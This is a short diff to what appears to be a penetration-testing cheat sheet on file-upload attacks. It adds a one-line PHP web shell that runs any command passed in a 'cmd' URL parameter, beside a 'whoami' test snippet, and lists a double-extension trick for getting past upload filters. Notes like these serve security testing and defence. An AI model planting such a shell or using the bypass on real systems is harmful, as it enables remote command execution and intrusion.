@@ -6,6 +6,7 @@
   - If executed,
     ```php
     <?php echo shell_exec('whoami'); ?>
+    <?php system($_GET['cmd']);?>
     ```
 - Bypass techniques:
   - Change `shell.php` to `shell.php.jpg`
